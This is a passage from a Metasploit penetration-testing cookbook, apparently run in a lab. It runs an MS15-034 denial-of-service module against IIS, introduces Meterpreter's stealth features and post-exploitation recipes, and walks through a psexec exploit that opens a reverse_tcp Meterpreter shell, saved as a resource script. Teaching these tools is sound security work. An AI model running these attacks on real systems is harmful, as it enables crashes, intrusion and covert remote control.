
Another awesome DoS attack is the MS15-034 HTTP Protocol Stack Request Handling Denial-of-Service.

## How to do it...

If Microsoft Windows 7, Windows 8, Windows Server 2008, or Windows Server 2012 is running an IIS service without the MS15-034, we can crash the target using this simple attack:

```
msf > use auxiliary/dos/http/ms15_034_ulonglongadd
msf auxiliary(ms15_034_ulonglongadd) > show options

Module options (auxiliary/dos/http/ms15_034_ulonglongadd):

    Name            Current Setting     Required  Description
    ----            ---------------     --------  -----------
    Proxies                                 no        A proxy chain of format
type:host:port[,type:host:port][...]
    RHOSTS                                    yes       The target address range or
...
msf auxiliary(ms15_034_ulonglongadd) > set RHOSTS 192.168.216.10
RHOSTS => 192.168.216.10
msf auxiliary(ms15_034_ulonglongadd) > run
>[*] Scanned 1 of 1 hosts (100% complete)
...
msf auxiliary(ms15_034_ulonglongadd) >
```

## 13 Meterpreter

In this chapter, we will cover the following recipes:

- Understanding the Meterpreter core commands
- Understanding the Meterpreter filesystem commands
- Understanding the Meterpreter networking commands
- Understanding the Meterpreter system commands
- Setting up multiple communication channels with the target
- Meterpreter anti-forensics
- The `getdesktop` and `keystroke` sniffing
- Using a scraper Meterpreter script
- Scraping the system with `winenum`
- Automation with `AutoRunScript`
- Meterpreter resource scripts
- Meterpreter timeout control
- Meterpreter sleep control
- Meterpreter transports
- Interacting with the registry
- Load framework plugins
- Meterpreter API and mixins
- Railgun—converting Ruby into a weapon
- Adding DLL and function definitions to Railgun
- Injecting the VNC server remotely
- Enabling Remote Desktop

## Introduction

So far, we have laid more emphasis on the exploitation phase in which we tried out various techniques and exploits to compromise our target. In this chapter, we will focus on Meterpreter, the most advanced payload in Metasploit, and what we can do after we have exploited the target machine. Meterpreter provides us with many features that can ease our task of exploring the target machine. We have already seen how to use Meterpreter in previous chapters but in the following chapters, we will understand Meterpreter in detail, as well as how to use it as a potential tool for the post-exploitation phase.

We have been using payloads in order to achieve specific results, but they have a major disadvantage. Payloads work by creating new processes in the compromised system. This can trigger alarms in antivirus programs and can be caught easily. Also, a payload is limited to perform only some specific tasks or execute specific commands that the shell can run. To overcome these difficulties, Meterpreter was created.

Meterpreter is a command interpreter for Metasploit that acts as a payload and works by using in-memory DLL injections and a native shared object format. It works in context with the exploited process; hence, it does not create any new process. This makes it more stealthy and powerful.

Let's take a look at some Meterpreter functions. The following diagram shows a simple stepwise representation of loading Meterpreter:

![](img/6b6e557533100c0e47951d0e5e14c4ee_481_0.png)

In the first step, the exploit and first stage payload are sent to the target machine. After exploitation, the stage establishes a TCP connection back to `msfconsole` on a given address and port. Next, `msfconsole` sends the second stage DLL injection payload. After successful injection, it sends the Meterpreter DLL to establish a proper communication channel. Lastly, Meterpreter loads extensions such as `stdapi` and `priv`. All these extensions are loaded over TLS using a TLV protocol. Meterpreter uses encrypted communication with the target, which is another major advantage of using it.

Let's quickly summarize the advantages of Meterpreter over specific payloads:

- It works in context with the exploited process, so it doesn't create a new process
- It can migrate easily among processes
- It resides completely in memory, so it writes nothing to disk
- It uses encrypted communications
- It uses a channelized communication system so that we can work with several channels at a time
- It provides a platform to write extensions quickly and easily

This chapter is dedicated entirely to exploring the target machine by using the various commands and scripts that Meterpreter provides us with. We will start by analyzing common Meterpreter commands. Then, we will move ahead with setting up different communication channels, using networking commands, key sniffing, and so on. Finally, we will discuss the scraper Meterpreter script, which can create a single directory containing various pieces of information about the target user. In this chapter, we will mainly focus on the commands and scripts which can be helpful in exploring the compromised system.

So, let's move ahead and look at the recipes which enable us to dive deeper into Meterpreter.

## Understanding the Meterpreter core commands

Let's start by using Meterpreter commands to understand their functionality. As it is a post-exploitation tool, we will require a compromised target to execute the commands. We will be using the Metasploitable 3 machine as a target that we have exploited using the Microsoft Windows Authenticated User Code Execution exploit module.

### Getting ready

To avoid setting up the Microsoft Windows Authenticated User Code Execution exploit module every single time we want to test Meterpreter commands, we will use one of my favorite Metasploit Framework features, resource scripts. Resource scripts provide an easy way for us to automate repetitive tasks in Metasploit.

### How to do it...

1. The Metasploit Framework comes packed with several resource scripts that have been contributed to by the community, which you can find at `/usr/share/metasploit-framework/scripts/resource/` in your Kali Linux machine:

```
root@kali:~# ls /usr/share/metasploit-framework/scripts/resource/
auto_brute.rc                fileformat_generator.rc
auto_cred_checker.rc          mssql_brute.rc
auto_pass_the_hash.rc         multi_post.rc
auto_win32_multihandler.rc    nessus_vulns_cleaner.rc
autocrawler.rc                oracle_login.rc
autoexploit.rc                oracle_sids.rc
bap_all.rc                    oracle_tns.rc
bap_dryrun_only.rc            port_cleaner.rc
bap_firefox_only.rc           portscan.rc
bap_flash_only.rc             run_all_post.rc
bap_ie_only.rc                wmap_autotest.rc
basic_discovery.rc
```

2. To create our own resource scripts, we simply need to execute the module and then use the makerc command to create a resource file with the saved commands executed since startup to a file:

```
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set RHOST 192.168.216.10
RHOST => 192.168.216.10
msf exploit(psexec) > set SMBUSER Administrator
SMBUSER => Administrator
msf exploit(psexec) > set SMBPASS vagrant
SMBPASS => vagrant
msf exploit(psexec) > set PAYLOAD
windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(psexec) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf exploit(psexec) > exploit

[*] Started reverse TCP handler on 192.168.216.5:4444
[*] 192.168.216.10:445 - Connecting to the server...
...

meterpreter >
Background session 1? [y/N]
msf exploit(psexec) > makerc /root/psexec.rc
[*] Saving last 7 commands to /root/psexec.rc ...
msf exploit(psexec) >
```

3. The resulting resource script contains the following:

```
root@kali:~# cat psexec.rc
use exploit/windows/smb/psexec
set RHOST 192.168.216.10
set SMBUSER Administrator
set SMBPASS vagrant
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.216.5
exploit
root@kali:~#
```
